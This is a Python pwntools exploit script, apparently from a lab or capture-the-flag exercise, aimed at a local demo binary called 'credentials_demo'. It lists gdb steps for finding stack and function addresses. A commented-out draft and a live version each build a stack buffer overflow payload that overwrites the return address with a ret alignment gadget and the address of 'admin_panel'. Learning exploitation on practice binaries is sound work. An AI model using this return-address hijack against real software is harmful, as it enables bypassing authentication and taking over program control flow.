#!/usr/bin/python

"""
STEPS:
1) Find the ret address of the `process_credentials` function
    gdb -q ./build/credentials_demo
    (gdb) b *(&process_credentials)
    (gdb) r
    (gdb) i r $rsp
        rsp            0x7fffffffd828      0x7fffffffd828
2) Find the address of the `buffer` array
    (gdb) p &buffer[0]
        $1 = 0x7fffffffd790 "\002"
3) Find the address of the `admin_panel` function
    (gdb) p &admin_panel
        $2 = (void (*)(void)) 0x401376 <admin_panel()>
"""

from pwn import *


# # Function to find symbols that contain a given substring
# def find_symbol_by_substring(binary, substring):
#     matching_symbols = {}
#     for symbol, address in binary.symbols.items():
#         if substring in symbol:
#             matching_symbols[symbol] = address
#     return matching_symbols

# context(arch='amd64', os='linux', endian='little', word_size=64)

# binary_path = 'build/credentials_demo'

# process_credentials_ret_addr = 0x7fffffffd828
# buffer_addr = 0x7fffffffd790

# binary = ELF(binary_path)
# # # Use the function to find symbols containing 'admin_panel'
# # matching_symbols = find_symbol_by_substring(binary, 'admin_panel')
# # # Print the matching symbols and their addresses
# # for symbol, address in matching_symbols.items():
# #     print(f">>> Symbol: {symbol}, Address: {hex(address)}")
# # # If you just want the address of the first match
# # if matching_symbols:
# #     first_match_address = list(matching_symbols.values())[0]
# #     print(f"Address of the first matching symbol: {hex(first_match_address)}")
# #admin_panel_addr = list(matching_symbols.values())[1]
# admin_panel_addr = 0x401376#binary.symbols['admin_panel']
# print(f'>>> admin_panel_addr: {hex(admin_panel_addr)}')


# p = process(binary_path)
# #p = gdb.debug([binary_path])

# payload = b''
# payload += b'a' * (process_credentials_ret_addr - buffer_addr)
# print(f'>>>>>>payload: {payload}, payload length: {len(payload)}')
# payload += p64(admin_panel_addr)

# p.readuntil('>')
# p.write(payload)
# p.interactive()
# #p.close()



"""
STEPS:
1) Find the ret address of the `process_credentials` function
    gdb -q ./build/credentials_demo
    (gdb) b *(&process_credentials)
    (gdb) r
    (gdb) i r $rsp
        rsp            0x7fffffffd838      0x7fffffffd838
2) Find the address of the `buffer` array
    (gdb) p &buffer[0]
        $1 = 0x7fffffffd800 ""
3) Find the address of the `admin_panel` function
    (gdb) p &admin_panel
        $2 = (void (*)(void)) 0x401376 <admin_panel()>
4) Allign the stack - the 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction. https://ropemporium.com/guide.html - The MOVAPS issue
    rop = ROP(build/credentials_demo)
    rop.gadgets
"""


from pwn import *            # This is how we import pwntools

binary_path = 'build/credentials_demo' # Path to the binary
binary = ELF(binary_path) # Load the binary
rop = ROP(binary_path) # Load the binary into ROP
p = process(binary_path) # We're starting a new process

buffer_addr = 0x7fffffffd800
process_credentials_ret_addr = 0x7fffffffd838
admin_panel_addr = binary.symbols['admin_panel']
ret_gadget_addr = rop.find_gadget(['ret']).address
print(f'>>> rop ret_gadget: {hex(ret_gadget_addr)}')
print(f'>>> admin_panel_addr: {hex(admin_panel_addr)}')

payload = b'A' * (process_credentials_ret_addr - buffer_addr)
payload += p64(ret_gadget_addr) # align stack
payload += p64(admin_panel_addr)   # Use pwntools to pack it

log.info(p.clean())          # Receive all the text
p.sendline(payload)
p.interactive()

log.info(p.clean())
